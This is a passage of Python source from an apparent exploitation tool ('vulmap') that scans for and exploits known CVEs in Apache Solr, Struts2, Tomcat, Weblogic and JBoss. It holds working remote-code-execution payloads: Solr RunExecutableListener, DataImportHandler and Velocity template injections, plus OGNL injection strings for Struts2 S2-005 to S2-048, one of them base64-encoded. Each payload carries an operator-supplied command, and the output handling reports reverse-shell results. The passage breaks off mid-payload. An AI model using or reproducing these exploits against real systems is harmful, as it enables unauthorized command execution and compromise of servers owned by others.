#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# author: zhzyker
# https://github.com/zhzyker/vulmap
import os
import sys
import argparse
import textwrap
import re
import time
import random
import string
import json
import requests
import socket
import base64
import http.client
import urllib
import urllib.request
from urllib import request, parse
from urllib.parse import urlencode
from urllib.parse import urlparse, quote
from datetime import datetime
from requests.packages import urllib3
from requests_toolbelt.utils import dump
from lxml import html
from bs4 import BeautifulSoup
from colorama import init, Fore, Back, Style
from ajpy.ajp import AjpResponse, AjpForwardRequest, AjpBodyRequest, NotFoundException

# http.client.HTTPConnection._http_vsn = 10
http.client.HTTPConnection._http_vsn_str = 'HTTP/1.0'
urllib3.disable_warnings()
headers = {
    'Accept': 'application/x-shockwave-flash,'
              'image/gif,'
              'image/x-xbitmap,'
              'image/jpeg,'
              'image/pjpeg,'
              'application/vnd.ms-excel,'
              'application/vnd.ms-powerpoint,'
              'application/msword,'
              '*/*',
    'User-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36',
    'Content-Type':'application/x-www-form-urlencoded'
}

init(autoreset=True)
class Colored(object):
    def magenta(self, s):
        return Style.BRIGHT+Fore.MAGENTA+s+Fore.RESET+Style.RESET_ALL
    def green(self, s):
        return Style.BRIGHT+Fore.GREEN+s+Fore.RESET+Style.RESET_ALL
    def white(self, s):
        return Fore.WHITE+s+Fore.RESET+Style.RESET_ALL
    def cyan(self, s):
        return Style.BRIGHT+Fore.CYAN+s+Fore.RESET+Style.RESET_ALL
    def ccyan(self, s):
        return Fore.CYAN+s+Fore.RESET+Style.RESET_ALL
    def yellow(self, s):
        return Style.BRIGHT+Fore.YELLOW+s+Fore.RESET+Style.RESET_ALL
    def red(self, s):
        return Style.BRIGHT+Fore.RED+s+Fore.RESET+Style.RESET_ALL
    def yeinfo(self):
        return Style.BRIGHT+Fore.YELLOW+"[INFO]"+Fore.RESET+Style.RESET_ALL
    def rewarn(self):
        return Style.BRIGHT+Fore.RED+"[WARN]"+Fore.RESET+Style.RESET_ALL
    # Vuln type
    def rce(self):
        return "[rce]"
    def derce(self):
        return "[deserialization rce]"
    def upload(self):
        return "[upload]"
    def deupload(self):
        return "[deserialization upload]"
    def de(self):
        return "[deserialization]"
    def contains(self):
        return "[file contains]"
    def xxe(self):
        return "[xxe]"
    def sql(self):
        return "[sql]"
    def ssrf(self):
        return "[ssrf]"
color = Colored()

#time.sleep(3)
vulnlist = color.ccyan("""
 +-------------------+------------------+-----+-----+-------------------------------------------------------------+
 | Target type       | Vuln Name        | Poc | Exp | Impact Version && Vulnerability description                 |
 +-------------------+------------------+-----+-----+-------------------------------------------------------------+
 | Apache Solr       | CVE-2017-12629   |  Y  |  Y  | < 7.1.0, runexecutablelistener rce & xxe, only rce is here  |
 | Apache Solr       | CVE-2019-0193    |  Y  |  Y  | < 8.2.0, dataimporthandler module remote code execution     |
 | Apache Solr       | CVE-2019-17558   |  Y  |  Y  | 5.0.0 - 8.3.1, velocity response writer rce                 |
 | Apache Struts2    | S2-005           |  Y  |  Y  | 2.0.0 - 2.1.8.1, cve-2010-1870 parameters interceptor rce   |
 | Apache Struts2    | S2-008           |  Y  |  Y  | 2.0.0 - 2.3.17, debugging interceptor rce                   |
 | Apache Struts2    | S2-009           |  Y  |  Y  | 2.1.0 - 2.3.1.1, cve-2011-3923 ognl interpreter rce         |
 | Apache Struts2    | S2-013           |  Y  |  Y  | 2.0.0 - 2.3.14.1, cve-2013-1966 ognl interpreter rce        |
 | Apache Struts2    | S2-015           |  Y  |  Y  | 2.0.0 - 2.3.14.2, cve-2013-2134 ognl interpreter rce        |
 | Apache Struts2    | S2-016           |  Y  |  Y  | 2.0.0 - 2.3.15, cve-2013-2251 ognl interpreter rce          |
 | Apache Struts2    | S2-029           |  Y  |  Y  | 2.0.0 - 2.3.24.1, ognl interpreter rce                      |
 | Apache Struts2    | S2-032           |  Y  |  Y  | 2.3.20-28, cve-2016-3081 rce can be performed via method    |
 | Apache Struts2    | S2-045           |  Y  |  Y  | 2.3.5-31, 2.5.0-10, cve-2017-5638 jakarta multipart rce     |
 | Apache Struts2    | S2-046           |  Y  |  Y  | 2.3.5-31, 2.5.0-10, cve-2017-5638 jakarta multipart rce     |
 | Apache Struts2    | S2-048           |  Y  |  Y  | 2.3.x, cve-2017-9791 struts2-struts1-plugin rce             |
 | Apache Struts2    | S2-052           |  Y  |  Y  | 2.1.2 - 2.3.33, 2.5 - 2.5.12 cve-2017-9805 rest plugin rce  |
 | Apache Struts2    | S2-057           |  Y  |  Y  | 2.0.4 - 2.3.34, 2.5.0-2.5.16, cve-2018-11776 namespace rce  |
 | Apache Struts2    | S2-059           |  Y  |  Y  | 2.0.0 - 2.5.20 cve-2019-0230 ognl interpreter rce           |
 | Apache Struts2    | S2-devMode       |  Y  |  Y  | 2.1.0 - 2.5.1, devmode remote code execution                |
 | Apache Tomcat     | Examples File    |  Y  |  N  | all version, /examples/servlets/servlet/SessionExample      |
 | Apache Tomcat     | CVE-2017-12615   |  Y  |  Y  | 7.0.0 - 7.0.81, put method any files upload                 |
 | Apache Tomcat     | CVE-2020-1938    |  Y  |  Y  | 6, 7 < 7.0.100, 8 < 8.5.51, 9 < 9.0.31 arbitrary file read  |
 | Drupal            | CVE-2018-7600    |  Y  |  Y  | 6.x, 7.x, 8.x, drupalgeddon2 remote code execution          |
 | Drupal            | CVE-2018-7602    |  Y  |  Y  | < 7.59, < 8.5.3 (except 8.4.8) drupalgeddon2 rce            |
 | Jenkins           | CVE-2017-1000353 |  Y  |  N  | <= 2.56, LTS <= 2.46.1, jenkins-ci remote code execution    |
 | Jenkins           | CVE-2018-1000861 |  Y  |  Y  | <= 2.153, LTS <= 2.138.3, remote code execution             |
 | Nexus OSS/Pro     | CVE-2019-7238    |  Y  |  Y  | 3.6.2 - 3.14.0, remote code execution vulnerability         |
 | Nexus OSS/Pro     | CVE-2020-10199   |  N  |  Y  | 3.x  <= 3.21.1, remote code execution vulnerability         |
 | Oracle Weblogic   | CVE-2014-4210    |  Y  |  N  | 10.0.2 - 10.3.6, weblogic ssrf vulnerability                |
 | Oracle Weblogic   | CVE-2017-3506    |  Y  |  Y  | 10.3.6.0, 12.1.3.0, 12.2.1.0-2, weblogic wls-wsat rce       |
 | Oracle Weblogic   | CVE-2017-10271   |  Y  |  Y  | 10.3.6.0, 12.1.3.0, 12.2.1.1-2, weblogic wls-wsat rce       |
 | Oracle Weblogic   | CVE-2018-2894    |  Y  |  Y  | 12.1.3.0, 12.2.1.2-3, deserialization any file upload       |
 | Oracle Weblogic   | CVE-2019-2725    |  Y  |  Y  | 10.3.6.0, 12.1.3.0, weblogic wls9-async deserialization rce |
 | Oracle Weblogic   | CVE-2019-2729    |  Y  |  Y  | 10.3.6.0, 12.1.3.0, 12.2.1.3 wls9-async deserialization rce |
 | Oracle Weblogic   | CVE-2020-2551    |  Y  |  N  | 10.3.6.0, 12.1.3.0, 12.2.1.3-4, wlscore deserialization rce |
 | RedHat JBoss      | CVE-2010-0738    |  Y  |  Y  | 4.2.0 - 4.3.0, jmx-console deserialization any files upload |
 | RedHat JBoss      | CVE-2010-1428    |  Y  |  Y  | 4.2.0 - 4.3.0, web-console deserialization any files upload |
 | RedHat JBoss      | CVE-2015-7501    |  Y  |  Y  | 5.x, 6.x, jmxinvokerservlet deserialization any file upload |
 +-------------------+------------------+-----+-----+-------------------------------------------------------------+
""")


class Timed(object):
    def timed(self, de):
        now = datetime.now()
        time.sleep(de)
        timed = color.cyan("["+str(now)[11:19]+"] ")
        return timed
    def timed_ouput_file(self, de):
        now = datetime.now()
        time.sleep(de)
        timed_ouput_file = "["+str(now)[11:19]+"] "
        return timed_ouput_file
now = Timed()


class Verification(object):
    def show(self, request, pocname, method, rawdata, info):
        if VULN is not None:
            if r"PoCWating" in request:
                print (now.timed(de=DELAY)+color.rewarn()+color.magenta(" Command Executed Failed... ..."))
            else:
                print (request)
            return None
        if CMD=="netstat -an" or CMD=="id":
            print (now.timed(de=DELAY)+color.green("[+] The target is "+pocname+" ["+method+"] "+info))
        else:
            print (now.timed(de=DELAY)+color.yellow("[?] Can't judge "+pocname))
        if DEBUG=="debug":
            print (rawdata)
        if OUTPUT is not None:
            self.file_output(self.no_color_show_succes(request, pocname, method, rawdata, info))
    def no_rce_show(self, request, pocname, method, rawdata, info):
        if VULN is not None:
            if r"PoCWating" in request:
                print (now.timed(de=DELAY)+color.yeinfo()+color.yellow(" Command Executed Successfully (No Echo)"))
            else:
                print (request)
            return None
        print (now.timed(de=DELAY)+color.green("[+] The target is "+pocname+" ["+method+"] "+info))
        #print (info)
        if DEBUG=="debug":
            print (rawdata)
        if OUTPUT is not None:
            self.file_output(self.no_color_show_succes(request, pocname, method, rawdata, info))
    def no_color_show_succes(self, request, pocname, method, rawdata, info):
        return now.timed_ouput_file(de=DELAY)+"[+] The target is "+pocname+" ["+method+"] "+info+'\n'+rawdata
    def no_color_show_failed(self, request, pocname, method, rawdata, info):
        return now.timed_ouput_file(de=DELAY)+"[-] The target is "+pocname+" ["+method+"] "
    def generic_output(self, request, pocname, method, rawdata, info):
        if r":-)" in request:
            self.no_rce_show(request, pocname, method, rawdata, info)
        # Apache Tomcat: verification CVE-2020-1938
        elif r"Welcome to Tomcat" in request and r"You may obtain a copy of the License at" in request:
            self.no_rce_show(request, pocname, method, rawdata, info)
        # Public: "ID" command exec
        elif r"uid=" in request:
            info = info+color.green(" [os:linux]")
            self.show(request, pocname, method, rawdata, info)
        # Struts2-045 "233x233"
        elif r"54289" in request:
            self.show(request, pocname, method, rawdata, info)
        # Public: "PoCSuCCeSS" in request
        elif r"PoCSuCCeSS" in request:
            self.no_rce_show(request, pocname, method, rawdata, info)
        # Public: "PoCWating" in request ,Failed
        elif r"PoCWating" in request:
            print (now.timed(de=DELAY)+color.magenta("[-] The target no "+pocname))
        # Public: "netstat -an" command check
        elif r"Active Internet connections" in request or r"command not found" in request:
            info = info+color.green(" [os:linux]")
            self.show(request, pocname, method, rawdata, info)
        elif r"Active Connections" in request  or r"活动连接" in request:
            info = info+color.green(" [os:windows]")
            self.show(request, pocname, method, rawdata, info)
        elif r"NC-Succes" in request:
            print (now.timed(de=DELAY)+color.yeinfo()+color.green(" The reverse shell succeeded. Please check"))
        elif r"NC-Failed" in request:
            print (now.timed(de=DELAY)+color.rewarn()+color.magenta(" The reverse shell failed. Please check"))
            
        else:
            #print (now.timed(de=DELAY)+color.magenta("[-] The target no "+pocname))
            if VULN is not None:
                if r"PoCWating" in request:
                    print (now.timed(de=DELAY)+color.rewarn()+color.magenta(" Command Executed Failed... ..."))
                else:
                    print (request)
                return None
            if CMD=="netstat -an" or CMD=="id":
                print (now.timed(de=DELAY)+color.magenta("[-] The target no "+pocname))
            else:
                print (now.timed(de=DELAY)+color.yellow("[?] Can't judge "+pocname))
            if DEBUG=="debug":
                print (rawdata)
            if OUTPUT is not None:
                self.file_output(self.no_color_show_failed(request, pocname, method, rawdata, info))
                
    def timeout_output(self, pocname):
        print (now.timed(de=DELAY)+color.rewarn()+color.cyan(" "+pocname+" check failed because timeout !!!"))
        if OUTPUT is not None:
            self.file_output(now.timed_ouput_file(de=DELAY)+" "+pocname+" check failed because timeout !!!")
    def connection_output(self, pocname):
        print (now.timed(de=DELAY)+color.rewarn()+color.cyan(" "+pocname+" check failed because unable to connect !!!"))
        if OUTPUT is not None:
            self.file_output(now.timed_ouput_file(de=DELAY)+" "+pocname+" check failed because unable to connect !!!")
    def file_output(self, item):
        with open(OUTPUT, 'a') as output_file:
            output_file.write("%s\n" % item)
verify = Verification()


class ApacheShiro():
    def __init__(self, url):
        self.url=url    

class ApacheSolr():
    def __init__(self, url):
        self.url = url
        # Change the url format to conform to the program
        self.getipport = urlparse(self.url)
        self.hostname = self.getipport.hostname
        self.port = self.getipport.port
        if r"https://" in self.url:
            self.url = "https://"+self.hostname+":"+str(self.port)
        if r"http://" in self.url:
            self.url = "http://"+self.hostname+":"+str(self.port)
        
        self.payload_cve_2017_12629 = '{"add-listener":{"event":"postCommit","name":"newcore","class":"solr.RunExecu' \
            'tableListener","exe":"sh","dir":"/bin/","args":["-c", "RECOMMAND"]}}'
        self.payload_cve_2019_0193 = "command=full-import&verbose=false&clean=false&commit=true&debug=true&core=test" \
            "&dataConfig=%3CdataConfig%3E%0A++%3CdataSource+type%3D%22URLDataSource%22%2F%3E%0A++%3Cscript%3E%3C!%5B" \
            "CDATA%5B%0A++++++++++function+poc()%7B+java.lang.Runtime.getRuntime().exec(%22RECOMMAND%22)%3B%0A++++++" \
            "++++%7D%0A++%5D%5D%3E%3C%2Fscript%3E%0A++%3Cdocument%3E%0A++++%3Centity+name%3D%22stackoverflow%22%0A++" \
            "++++++++++url%3D%22https%3A%2F%2Fstackoverflow.com%2Ffeeds%2Ftag%2Fsolr%22%0A++++++++++++processor%3D%2" \
            "2XPathEntityProcessor%22%0A++++++++++++forEach%3D%22%2Ffeed%22%0A++++++++++++transformer%3D%22script%3A" \
            "poc%22+%2F%3E%0A++%3C%2Fdocument%3E%0A%3C%2FdataConfig%3E&name=dataimport"
        self.payload_cve_2019_17558="/select?q=1&&wt=velocity&v.template=cus" \
            "tom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.for" \
            "Name(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27" \
            "java.lang.Character%27))+%23set($str=$x.class.forName(%27java.l" \
            "ang.String%27))+%23set($ex=$rt.getRuntime().exec(%27RECOMMAND%2" \
            "7))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach(" \
            "$i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read" \
            "()))%23end"

    def cve_2017_12629(self):
        self.pocname = "Apache Solr: CVE-2017-12629"
        self.corename = "null"
        self.newcore = ''.join(random.choices(string.ascii_letters+string.digits, k=6))
        self.payload1 = self.payload_cve_2017_12629.replace("RECOMMAND", CMD).replace("newcore", self.newcore)
        self.payload2 = '[{"id": "test"}]'
        self.rawdata = None
        self.info = None
        self.r = "PoCWating"
        self.urlcore = self.url+"/solr/admin/cores?indexInfo=false&wt=json"
        self.headers_solr1 = {
            'Host': "localhost",
            'Accept': "*/*",
            'User-Agent': "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
            'Connection': "close"
        }
        self.headers_solr2 = {
            'Host': "localhost",
            'ccept-Language': "en",
            'User-Agent': "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
            'Connection': "close",
            'Content-Type': "application/json"
        }
        self.method = "post"
        self.r = "PoCWating"
        try:
            self.request = requests.get(url=self.urlcore, headers=headers, timeout=TIMEOUT, verify=False)
            try:
                self.corename = list(json.loads(self.request.text)["status"])[0]
            except:
                pass
            self.request = requests.post(self.url+"/solr/"+str(self.corename)+"/config", data=self.payload1, headers=self.headers_solr1, timeout=TIMEOUT, verify=False)
            #print (dump.dump_all(self.request).decode('utf-8'))
            if self.request.status_code == 200 and self.corename != "null":
                self.r = "PoCSuCCeSS"
            self.request = requests.post(self.url+"/solr/"+str(self.corename)+"/update", data=self.payload2, headers=self.headers_solr2, timeout=TIMEOUT, verify=False)
            self.rawdata = dump.dump_all(self.request).decode('utf-8')
            self.info = color.rce()+color.green(" [newcore:"+self.newcore+"] ")
            verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
        except requests.exceptions.Timeout as error:
            verify.timeout_output(self.pocname)
        except requests.exceptions.ConnectionError as error:
            verify.connection_output(self.pocname)
        except Exception as error:
            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)

    def cve_2019_0193(self):
        self.pocname = "Apache Solr: CVE-2019-0193"
        self.corename = "null"
        self.info = None
        self.method = "get"
        self.r = "PoCWating"
        self.payload = self.payload_cve_2019_0193.replace("RECOMMAND", quote(CMD,'utf-8'))
        self.solrhost = self.hostname+":"+str(self.port)
        self.headers = {
            'Host': ""+self.solrhost,
            'User-Agent': "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
            'Accept': "application/json, text/plain, */*",
            'Accept-Language': "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            'Accept-Encoding': "zip, deflate",
            'Referer': self.url+"/solr/",
            'Content-type': "application/x-www-form-urlencoded",
            'X-Requested-With': "XMLHttpRequest",
            'Connection': "close"
        }
        self.urlcore = self.url+"/solr/admin/cores?indexInfo=false&wt=json"
        try:
            self.request = requests.get(url=self.urlcore, headers=headers, timeout=TIMEOUT, verify=False)
            try:
                self.corename = list(json.loads(self.request.text)["status"])[0]
            except:
                pass
            self.urlconfig = self.url+"/solr/"+str(self.corename)+"/admin/mbeans?cat=QUERY&wt=json"
            # check solr mode: "solr.handler.dataimport.DataImportHandler"
            self.request = requests.get(url=self.urlconfig, headers=headers, timeout=TIMEOUT, verify=False)
            self.urlcmd = self.url+"/solr/"+str(self.corename)+"/dataimport"
            self.request = requests.post(self.urlcmd, data=self.payload, headers=headers, timeout=TIMEOUT, verify=False)
            if self.request.status_code==200 and self.corename!="null":
                self.r = "PoCSuCCeSS"
            self.rawdata = dump.dump_all(self.request).decode('utf-8')
            self.info = color.rce()+color.green(" [corename:"+str(self.corename)+"]")
            verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
        except requests.exceptions.Timeout as error:
            verify.timeout_output(self.pocname)
        except requests.exceptions.ConnectionError as error:
            verify.connection_output(self.pocname)
        except Exception as error:
            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)

    def cve_2019_17558(self):
        self.pocname = "Apache Solr: CVE-2019-17558"
        self.corename = None
        self.payload_1 = self.payload_cve_2019_17558.replace("RECOMMAND","id")
        self.payload_2 = self.payload_cve_2019_17558.replace("RECOMMAND",CMD)
        self.method = "get&post"
        self.urlcore = self.url+"/solr/admin/cores?indexInfo=false&wt=json"
        self.rawdata = None
        try:
            self.request = requests.get(url=self.urlcore, timeout=TIMEOUT, verify=False)
            try:
                self.corename = list(json.loads(self.request.text)["status"])[0]
            except:
                pass
            self.info = color.rce()+color.green(" [corename:"+str(self.corename)+"]")
            self.urlapi = self.url+"/solr/"+str(self.corename)+"/config"
            self.headers_json = {'Content-Type': 'application/json'}
            self.set_api_data = {
                "update-queryresponsewriter": {
                    "startup": "lazy",
                    "name": "velocity",
                    "class": "solr.VelocityResponseWriter",
                    "template.base.dir": "",
                    "solr.resource.loader.enabled": "true",
                    "params.resource.loader.enabled": "true"
                }
            }
            self.request = requests.post(self.urlapi, data=self.set_api_data, headers=self.headers_json, timeout=TIMEOUT, verify=False)

            self.request = requests.get(self.url+"/solr/"+str(self.corename)+self.payload_2, timeout=TIMEOUT, verify=False)
            self.rawdata = dump.dump_all(self.request).decode('utf-8')
            verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
        except requests.exceptions.Timeout as error:
            verify.timeout_output(self.pocname)
        except requests.exceptions.ConnectionError as error:
            verify.connection_output(self.pocname)
        except Exception as error:
            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
            
            
            
# ApacheStruts2 vulnerability check
# Both windows and linux have built-in "netstat" command
# Relying on the execution of the "netstat -an" command to determine that there is a vulnerability
class ApacheStruts2():
    def __init__(self, url):
        http.client.HTTPConnection._http_vsn_str = 'HTTP/1.0'
        self.url=url
        self.payload_s2_005 = r"('\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\43context[\'xwork.Method" \
            r"Accessor.denyMethodExecution\']\75false')(b))&('\43c')(('\43_memberAccess.excludeProperties\75@java.ut" \
            r"il.Collections@EMPTY_SET')(c))&(g)(('\43mycmd\75\'RECOMMAND\'')(d))&(h)(('\43myret\75@java.lang.Runtim" \
            r"e@getRuntime().exec(\43mycmd)')(d))&(i)(('\43mydat\75new\40java.io.DataInputStream(\43myret.getInputSt" \
            r"ream())')(d))&(j)(('\43myres\75new\40byte[51020]')(d))&(k)(('\43mydat.readFully(\43myres)')(d))&(l)(('" \
            r"\43mystr\75new\40java.lang.String(\43myres)')(d))&(m)(('\43myout\75@org.apache.struts2.ServletActionCo" \
            r"ntext@getResponse()')(d))&(n)(('\43myout.getWriter().println(\43mystr)')(d))"
        self.payload_s2_008=  '?debug=command&expression=(%23_memberAccess%5B"allowStaticMethodAccess"%5D%3Dtrue%2C%' \
            '23foo%3Dnew%20java.lang.Boolean%28"false"%29%20%2C%23context%5B"xwork.MethodAccessor.denyMethodExecutio' \
            'n"%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%' \
            '27RECOMMAND%27%29.getInputStream%28%29%29)'
        self.payload_s2_009=r"class.classLoader.jarPath=%28%23context[%22xwo" \
            r"rk.MethodAccessor.denyMethodExecution%22]%3d+new+java.lang.Boo" \
            r"lean%28false%29%2c+%23_memberAccess[%22allowStaticMethodAccess" \
            r"%22]%3dtrue%2c+%23a%3d%40java.lang.Runtime%40getRuntime%28%29." \
            r"exec%28%27RECOMMAND%27%29.getInputStream%28%29%2c%23b%3dnew+ja" \
            r"va.io.InputStreamReader%28%23a%29%2c%23c%3dnew+java.io.Buffere" \
            r"dReader%28%23b%29%2c%23d%3dnew+char[50000]%2c%23c.read" \
            r"%28%23d%29%2c%23sbtest%3d%40org.apache.struts2.ServletActionCo" \
            r"ntext%40getResponse%28%29.getWriter%28%29%2c%23sbtest.println" \
            r"%28%23d%29%2c%23sbtest.close%28%29%29%28meh%29&z[%28class.clas" \
            r"sLoader.jarPath%29%28%27meh%27%29]"
        self.payload_s2_013='?233=%24%7B%23_memberAccess%5B"allowStaticMetho' \
            'dAccess"%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime()' \
            '.exec(%27RECOMMAND%27).getInputStream()%2C%23b%3Dnew%20java.io.' \
            'InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%' \
            '23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%' \
            '3D%40org.apache.struts2.ServletActionContext%40getResponse().ge' \
            'tWriter()%2C%23out.println(%27dbapp%3D%27%2Bnew%20java.lang.Str' \
            'ing(%23d))%2C%23out.close()%7D'
        self.payload_s2_015 = r"/${%23context['xwork.MethodAccessor.denyMethodExecution']=false,%23f=%23_memberAcces" \
            r"s.getClass().getDeclaredField('allowStaticMethodAccess'),%23f.setAccessible(true),%23f.set(%23_memberA" \
            r"ccess, true),@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInp" \
            r"utStream())}.action"
        self.payload_s2_016_1=r"?redirect:${%23req%3d%23context.get(%27co%27" \
            r"%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atc" \
            r"her.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23s%3dnew%20java" \
            r".util.Scanner((new%20java.lang.ProcessBuilder(%27RECOMMAND%27." \
            r"toString().split(%27\\s%27))).start().getInputStream()).useDel" \
            r"imiter(%27\\A%27),%23str%3d%23s.hasNext()?%23s.next():%27%27," \
            r"%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony" \
            r".xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes" \
            r"%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27)," \
            r"%23resp.getWriter().println(%23str),%23resp.getWriter().flush" \
            r"(),%23resp.getWriter().close()}"
        self.payload_s2_016_2 = base64.b64decode("cmVkaXJlY3Q6JHslMjNyZXElM2QlMjNjb250ZXh0LmdldCglMjdjbyUyNyUyYiUyN2" 
            "0ub3BlbiUyNyUyYiUyN3N5bXBob255Lnh3byUyNyUyYiUyN3JrMi5kaXNwJTI3JTJiJTI3YXRjaGVyLkh0dHBTZXIlMjclMmIlMjd2b" 
            "GV0UmVxJTI3JTJiJTI3dWVzdCUyNyksJTIzcyUzZG5ldyUyMGphdmEudXRpbC5TY2FubmVyKChuZXclMjBqYXZhLmxhbmcuUHJvY2Vz" 
            "c0J1aWxkZXIoJTI3bmV0c3RhdCUyMC1hbiUyNy50b1N0cmluZygpLnNwbGl0KCUyN1xccyUyNykpKS5zdGFydCgpLmdldElucHV0U3R" 
            "yZWFtKCkpLnVzZURlbGltaXRlciglMjdcXEElMjcpLCUyM3N0ciUzZCUyM3MuaGFzTmV4dCgpPyUyM3MubmV4dCgpOiUyNyUyNywlMj" 
            "NyZXNwJTNkJTIzY29udGV4dC5nZXQoJTI3Y28lMjclMmIlMjdtLm9wZW4lMjclMmIlMjdzeW1waG9ueS54d28lMjclMmIlMjdyazIuZ" 
            "GlzcCUyNyUyYiUyN2F0Y2hlci5IdHRwU2VyJTI3JTJiJTI3dmxldFJlcyUyNyUyYiUyN3BvbnNlJTI3KSwlMjNyZXNwLnNldENoYXJh" 
            "Y3RlckVuY29kaW5nKCUyN1VURi04JTI3KSwlMjNyZXNwLmdldFdyaXRlcigpLnByaW50bG4oJTIzc3RyKSwlMjNyZXNwLmdldFdyaXR" 
            "lcigpLmZsdXNoKCksJTIzcmVzcC5nZXRXcml0ZXIoKS5jbG9zZSgpfQ==")
        self.payload_s2_029 = r"=(%23_memberAccess[%27allowPrivateAccess%27]=true,%23_memberAccess[%27allowProtected" \
            r"Access%27]=true,%23_memberAccess[%27excludedPackageNamePatterns%27]=%23_memberAccess[%27acceptProperti" \
            r"es%27],%23_memberAccess[%27excludedClasses%27]=%23_memberAccess[%27acceptProperties%27],%23_memberAcce" \
            r"ss[%27allowPackageProtectedAccess%27]=true,%23_memberAccess[%27allowStaticMethodAccess%27]=true,@org.a" \
            r"pache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%27RECOMMAND%27).getInputStream" \
            r"()))"
        self.payload_s2_032 = r"?method:%23_memberAccess%3d@ognl.OgnlContext@D EFAULT_MEMBER_ACCESS,%23res%3d%40org." \
            r"apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding" \
            r"[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23pa" \
            r"rameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.ne" \
            r"xt()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&cmd=RECOMMAND&" \
            r"pp=____A&ppp=%20&encoding=UTF-8"
        self.payload_s2_045=r"%{(#toolslogo='multipart/form-data').(#dm=@ogn" \
            r"l.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_member" \
            r"Access=#dm):((#container=#context['com.opensymphony.xwork2.Act" \
            r"ionContext.container']).(#ognlUtil=#container.getInstance(@com" \
            r".opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExclu" \
            r"dedPackageNames().clear()).(#ognlUtil.getExcludedClasses().cle" \
            r"ar()).(#context.setMemberAccess(#dm)))).(#cmd='RECOMMAND').(#i" \
            r"swin=(@java.lang.System@getProperty('os.name').toLowerCase().c" \
            r"ontains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/b" \
            r"ash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p" \
            r".redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org." \
            r"apache.struts2.ServletActionContext@getResponse().getOutputStr" \
            r"eam())).(@org.apache.commons.io.IOUtils@copy(#process.getInput" \
            r"Stream(),#ros)).(#ros.flush())}"
        self.payload_s2_046='''-----------------------------\r\n ''' \
            '''Content-Disposition: form-data; name=\"foo\"; filename=\"%{''' \
            '''(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_M''' \
            '''EMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#conta''' \
            '''iner=#context['com.opensymphony.xwork2.ActionContext.contai''' \
            '''ner']).(#ognlUtil=#container.getInstance(@com.opensymphony.''' \
            '''xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageN''' \
            '''ames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#''' \
            '''context.setMemberAccess(#dm)))).(#cmd='RECOMMAND').(#iswin=''' \
            '''(@java.lang.System@getProperty('os.name').toLowerCase().con''' \
            '''tains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/''' \
            '''bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds))''' \
            '''.(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros''' \
            '''=(@org.apache.struts2.ServletActionContext@getResponse().ge''' \
            '''tOutputStream())).(@org.apache.commons.io.IOUtils@copy(#pro''' \
            '''cess.getInputStream(),#ros)).(#ros.flush())}\x00b\"\r\nCont''' \
            '''ent-Type: text/plain\r\n\r\nzzzzz\r\n----------------------''' \
            '''---------\r\n\r\n'''
        self.payload_s2_048=r"%{(#szgx='multipart/form-data').(#dm=@ognl.Ogn" \
            r"lContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAcces" \
            r"s=#dm):((#container=#context['com.opensymphony.xwork2.ActionCo" \
            r"ntext.container']).(#ognlUtil=#container.getInstance(@com.open" \
            r"symphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPa" \
            r"ckageNames().clear()).(#ognlUtil.getExcludedClasses().clear())" \
            r".(#context.setMemberAccess(#dm)))).(#cmd='RECOMMAND').(#iswin=" \
            r"(@java.lang.System@getProperty('os.name').toLowerCase().contai" \
            r"ns('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash'," \
